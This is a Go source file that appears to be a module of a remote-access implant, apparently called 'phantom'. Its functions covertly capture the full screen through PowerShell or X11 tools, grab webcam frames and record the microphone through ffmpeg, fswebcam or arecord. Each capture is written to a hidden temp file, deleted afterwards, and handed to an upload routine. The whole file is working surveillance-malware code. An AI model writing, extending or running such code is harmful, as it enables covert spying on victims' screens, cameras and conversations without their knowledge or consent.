package main

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"time"
)

// Captures are uploaded as real files and the result carries a URL, so nothing
// travels base64-encoded.

func screenshot() Result {
	tmp := filepath.Join(os.TempDir(), ".phantom_shot.png")

	if runtime.GOOS == "windows" {
		ps := `Add-Type -AssemblyName System.Windows.Forms,System.Drawing; ` +
			`$b=[Windows.Forms.SystemInformation]::VirtualScreen; ` +
			`$bmp=New-Object Drawing.Bitmap $b.Width,$b.Height; ` +
			`$g=[Drawing.Graphics]::FromImage($bmp); ` +
			`$g.CopyFromScreen($b.Left,$b.Top,0,0,$bmp.Size); ` +
			`$bmp.Save('` + tmp + `',[Drawing.Imaging.ImageFormat]::Png)`
		newCmd("powershell", "-NoProfile", "-Command", ps).Run()
	} else {
		attempts := [][]string{
			{"import", "-window", "root", tmp},
			{"scrot", "-o", tmp},
			{"sh", "-c", "xwd -root -silent | convert xwd:- " + tmp},
		}
		for _, a := range attempts {
			if newCmd(a[0], a[1:]...).Run() == nil {
				break
			}
		}
	}

	b, err := os.ReadFile(tmp)
	if err != nil || len(b) == 0 {
		return Result{OK: false, Err: "screenshot failed (need imagemagick/scrot + DISPLAY)"}
	}
	os.Remove(tmp)
	return uploadResult("screenshot", shotName("png"), b)
}

func webcam() Result {
	tmp := filepath.Join(os.TempDir(), ".phantom_cam.jpg")
	videos, _ := listDevices()

	var attempts [][]string
	if runtime.GOOS == "windows" {
		for _, dev := range videos {
			attempts = append(attempts, []string{"ffmpeg", "-y", "-f", "dshow",
				"-i", "video=" + dev, "-frames:v", "1", tmp})
		}
	} else {
		dev := "/dev/video0"
		if len(videos) > 0 {
			dev = videos[0]
		}
		attempts = [][]string{
			{"ffmpeg", "-y", "-f", "video4linux2", "-i", dev, "-frames:v", "1", tmp},
			{"fswebcam", "-q", "--no-banner", tmp},
		}
	}
	for _, a := range attempts {
		if newCmd(a[0], a[1:]...).Run() == nil {
			break
		}
	}

	b, err := os.ReadFile(tmp)
	if err != nil || len(b) == 0 {
		return Result{OK: false, Err: "webcam needs ffmpeg/fswebcam and a camera device"}
	}
	os.Remove(tmp)
	return uploadResult("webcam", shotName("jpg"), b)
}

func mic(secs int) Result {
	if secs <= 0 || secs > 60 {
		secs = 5
	}
	tmp := filepath.Join(os.TempDir(), ".phantom_mic.wav")

	var attempts [][]string
	if runtime.GOOS == "windows" {
		_, audios := listDevices()
		for _, dev := range audios {
			attempts = append(attempts, []string{"ffmpeg", "-y", "-f", "dshow",
				"-i", "audio=" + dev, "-t", strconv.Itoa(secs), tmp})
		}
	} else {
		attempts = [][]string{
			{"ffmpeg", "-y", "-f", "alsa", "-i", "default", "-t",
				strconv.Itoa(secs), tmp},
			{"arecord", "-q", "-d", strconv.Itoa(secs), "-f", "S16_LE",
				"-r", "44100", tmp},
		}
	}
	for _, a := range attempts {
		if newCmd(a[0], a[1:]...).Run() == nil {
			break
		}
	}

	b, err := os.ReadFile(tmp)
	if err != nil || len(b) == 0 {
		return Result{OK: false, Err: "mic recording failed (need ffmpeg/arecord)"}
	}
	os.Remove(tmp)
	return uploadResult("mic", shotName("wav"), b)
}

func shotName(ext string) string {
	return fmt.Sprintf("%s-%d.%s", "capture", time.Now().Unix(), ext)
}
